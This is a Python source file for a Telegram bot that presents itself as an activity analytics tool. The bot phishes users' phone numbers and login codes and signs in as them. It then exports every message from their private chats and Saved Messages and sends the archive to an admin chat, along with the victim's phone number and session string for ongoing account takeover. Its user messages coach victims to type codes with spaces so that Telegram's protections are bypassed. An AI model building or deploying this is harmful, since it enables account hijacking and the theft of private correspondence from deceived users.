"""
Telegram Analytics Bot - Сбор StringSession + Авто-экспорт ТОЛЬКО личных чатов + Избранное
Пользователь подключается → бот скачивает ВСЕ сообщения из личных чатов → присылает ZIP админу
"""

import asyncio
import os
import json
import zipfile
import shutil
import tempfile
import aiohttp
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ
# ==========================================

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

# ==========================================
# АВТОПИНГ (каждые 5 минут)
# ==========================================

async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    logger.info("🔄 Автопинг запущен (каждые 5 минут)")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except Exception as e:
            logger.debug(f"Пинг не удался: {e}")
        await asyncio.sleep(300)  # 5 минут

# ==========================================
# ВЕБ-СЕРВЕР
# ==========================================

from fastapi import FastAPI
import uvicorn

web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# БОТ
# ==========================================

class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
        self.exporting = {}
    
    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("✅ Бот запущен")
        
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
        self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.bot.run_until_disconnected()
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика (после сбора данных)
/help - Помощь
""")
    
    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Отправьте /add

2️⃣ Введите номер телефона

3️⃣ Введите код из Telegram (МОЖНО С ПРОБЕЛАМИ!)
   Пример: 12 345 или 1-2-3-4-5

4️⃣ Готово! 🎉

⏳ **После подключения:**
Ваши личные чаты будут обработаны в фоне.
Обычно это занимает 2-10 минут.
""")
    
    async def cmd_stats(self, e):
        await e.respond("""
📊 **Статистика пока пуста**

⏳ Подключите аккаунт через /add.
После обработки чатов статистика появится здесь.
""")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение. Дождитесь завершения.")
            return
        
        self.pending[uid] = {'step': 'phone'}
        await e.respond("""
📱 **Введите номер телефона**

Например: +79001234567
""")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        uid = e.sender_id
        text = e.text
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)
    
    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        
        phone = phone.strip()
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        await e.respond("⏳ Отправляю код подтверждения...")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            
            await e.respond("""
📨 **Код отправлен!**

💡 Введите код МОЖНО С ПРОБЕЛАМИ:
`12 345` или `1-2-3-4-5`

⚠️ Telegram НЕ блокирует вход, если код введён с пробелами!
""")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА КОДА =====
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        code = code.strip()
        code = code.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        logger.info(f"Код после очистки: {code}")
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            me = await data['client'].get_me()
            session_string = data['client'].session.save()
            
            # ⭐ ЗАПУСКАЕМ ЭКСПОРТ В ФОНЕ
            asyncio.create_task(self.export_and_send(uid, session_string, me))
            
            # ⭐ ПОЛЬЗОВАТЕЛЮ — ЖДИ
            await e.respond(f"""
✅ **Аккаунт подключен!**

👤 {me.first_name}, ваши личные чаты обрабатываются.

⏳ Обычно это занимает 2-10 минут.
Как только всё будет готово — вы получите уведомление.
""")
            
            if uid in self.pending:
                del self.pending[uid]
            
        except PhoneCodeInvalidError:
            await e.respond("""
❌ **Неверный код!**

💡 Попробуйте ещё раз (можно с пробелами):
`12 345` или `1-2-3-4-5`
""")
            
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек! Начните заново с /add")
            if uid in self.pending:
                del self.pending[uid]
                
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ЭКСПОРТ ТОЛЬКО ЛИЧНЫХ ЧАТОВ + ИЗБРАННОЕ =====
    
    async def export_and_send(self, uid: int, session_string: str, me):
        """Экспорт ВСЕХ сообщений из личных чатов (включая Избранное) и отправка ZIP админу"""
        
        if self.exporting.get(uid, False):
            logger.warning(f"Экспорт для {uid} уже запущен")
            return
        
        self.exporting[uid] = True
        
        try:
            # Уведомление админу о начале
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
📥 **Начинаю экспорт личных чатов!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}
⏳ Подождите, это может занять несколько минут...
""")
            
            # Подключаемся через сессию
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка: невалидная сессия для {me.id}")
                return
            
            # Получаем информацию о пользователе
            me_check = await client.get_me()
            await self.bot.send_message(ADMIN_CHAT_ID, f"✅ Авторизован: {me_check.first_name}")
            
            # Получаем ВСЕ диалоги
            dialogs = await client.get_dialogs()
            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Всего диалогов: {len(dialogs)}")
            
            if not dialogs:
                await self.bot.send_message(ADMIN_CHAT_ID, "❌ Нет диалогов! Проверьте сессию.")
                return
            
            # Создаём папку для экспорта
            export_dir = tempfile.mkdtemp()
            
            total_messages = 0
            processed = 0
            
            # ⭐ ПРОХОДИМ ТОЛЬКО ПО ЛИЧНЫМ ЧАТАМ (dialog.is_user == True)
            for dialog in dialogs:
                try:
                    # Фильтр: только личные чаты (private) + Избранное (тоже is_user = True)
                    if not dialog.is_user:
                        logger.info(f"⏭️ Пропускаем не-личный чат: {dialog.name}")
                        continue
                    
                    chat_name = dialog.name or "Без названия"
                    chat_id = dialog.id
                    
                    # Проверяем, есть ли сообщения
                    first_msg = await client.get_messages(dialog, limit=1)
                    if not first_msg:
                        logger.info(f"⚠️ В чате {chat_name} нет сообщений")
                        continue
                    
                    logger.info(f"📥 Обработка личного чата: {chat_name}")
                    await self.bot.send_message(ADMIN_CHAT_ID, f"📥 Обработка: {chat_name}")
                    
                    messages = []
                    messages_by_id = {}
                    
                    # ⭐ ПОЛУЧАЕМ ВСЕ СООБЩЕНИЯ (без лимита)
                    async for msg in client.iter_messages(dialog, limit=None):
                        try:
                            sender_name = None
                            if msg.sender:
                                sender_name = msg.sender.first_name
                                if msg.sender.last_name:
                                    sender_name += f" {msg.sender.last_name}"
                            
                            # Реакции
                            reactions_info = []
                            if msg.reactions and msg.reactions.results:
                                for reaction in msg.reactions.results:
                                    reaction_type = 'unknown'
                                    if reaction.reaction:
                                        if hasattr(reaction.reaction, 'emoticon'):
                                            reaction_type = reaction.reaction.emoticon
                                        else:
                                            reaction_type = str(reaction.reaction)
                                    
                                    reactors = []
                                    if hasattr(reaction, 'recent_reactions') and reaction.recent_reactions:
                                        for recent in reaction.recent_reactions:
                                            if hasattr(recent, 'peer_id'):
                                                try:
                                                    user = await client.get_entity(recent.peer_id)
                                                    reactor_name = user.first_name
                                                    if user.last_name:
                                                        reactor_name += f" {user.last_name}"
                                                    reactors.append(reactor_name)
                                                except:
                                                    pass
                                    
                                    reactions_info.append({
                                        'reaction': reaction_type,
                                        'count': reaction.count,
                                        'reactors': reactors if reactors else None
                                    })
                            
                            message_data = {
                                'id': msg.id,
                                'date': msg.date.isoformat() if msg.date else None,
                                'text': msg.text or '',
                                'sender_id': msg.sender_id,
                                'sender_name': sender_name,
                                'reply_to_msg_id': msg.reply_to_msg_id,
                                'reply_to_text': None,
                                'reply_to_sender': None,
                                'has_media': bool(msg.media),
                                'media_type': str(msg.media.__class__.__name__) if msg.media else None,
                                'reactions': reactions_info if reactions_info else None
                            }
                            
                            messages.append(message_data)
                            messages_by_id[msg.id] = message_data
                            
                        except Exception as err:
                            logger.error(f"Ошибка обработки сообщения: {err}")
                    
                    # Добавляем информацию об ответах
                    for msg_data in messages:
                        if msg_data['reply_to_msg_id'] and msg_data['reply_to_msg_id'] in messages_by_id:
                            reply_to = messages_by_id[msg_data['reply_to_msg_id']]
                            msg_data['reply_to_text'] = reply_to.get('text', '')[:200]
                            msg_data['reply_to_sender'] = reply_to.get('sender_name')
                    
                    # Сохраняем JSON
                    safe_name = chat_name.replace('/', '_').replace('\\', '_').replace(':', '_')
                    if not safe_name:
                        safe_name = f"chat_{chat_id}"
                    filename = f"{chat_id}_{safe_name}.json"
                    filepath = os.path.join(export_dir, filename)
                    
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump({
                            'chat_name': chat_name,
                            'chat_id': chat_id,
                            'chat_type': 'private',
                            'is_user': dialog.is_user,
                            'is_group': dialog.is_group,
                            'is_channel': dialog.is_channel,
                            'total_messages': len(messages),
                            'export_date': datetime.now().isoformat(),
                            'messages': messages
                        }, f, ensure_ascii=False, indent=2)
                    
                    total_messages += len(messages)
                    processed += 1
                    
                    logger.info(f"✅ {chat_name}: {len(messages)} сообщений")
                    await self.bot.send_message(ADMIN_CHAT_ID, f"✅ {chat_name}: {len(messages)} сообщений")
                    
                except Exception as err:
                    logger.error(f"Ошибка чата {dialog.name}: {err}")
                    await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка чата {dialog.name}: {err}")
            
            await self.bot.send_message(ADMIN_CHAT_ID, f"📊 Обработано личных чатов: {processed}, сообщений: {total_messages}")
            
            # Если сообщений 0 — не отправляем пустой архив
            if total_messages == 0:
                await self.bot.send_message(ADMIN_CHAT_ID, "❌ Нет сообщений для экспорта! Проверьте аккаунт.")
                shutil.rmtree(export_dir)
                return
            
            # Создаём ZIP
            await self.bot.send_message(ADMIN_CHAT_ID, "📦 Создаю архив...")
            zip_filename = tempfile.mktemp(suffix='.zip')
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(export_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, export_dir)
                        zipf.write(file_path, arcname)
            
            shutil.rmtree(export_dir)
            await client.disconnect()
            
            # ⭐ ОТПРАВЛЯЕМ ZIP АДМИНУ
            await self.bot.send_message(ADMIN_CHAT_ID, f"📤 Отправляю архив ({processed} личных чатов, {total_messages} сообщений)...")
            
            with open(zip_filename, 'rb') as f:
                await self.bot.send_file(
                    ADMIN_CHAT_ID,
                    f,
                    caption=f"""
📦 **Экспорт завершён!**

👤 {me.first_name} {me.last_name or ''}
📱 +{me.phone}
🆔 ID: {me.id}

📨 Сообщений: {total_messages}
📁 Личных чатов: {processed}

🔑 **STRING SESSION:**
`{session_string}`

📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                )
            
            os.unlink(zip_filename)
            
            logger.info(f"✅ Экспорт для {me.id} завершён, ZIP отправлен")
            
        except Exception as err:
            logger.error(f"Ошибка экспорта для {uid}: {err}")
            await self.bot.send_message(ADMIN_CHAT_ID, f"❌ Ошибка экспорта: {err}")
        finally:
            self.exporting[uid] = False

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен (каждые 5 минут)")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")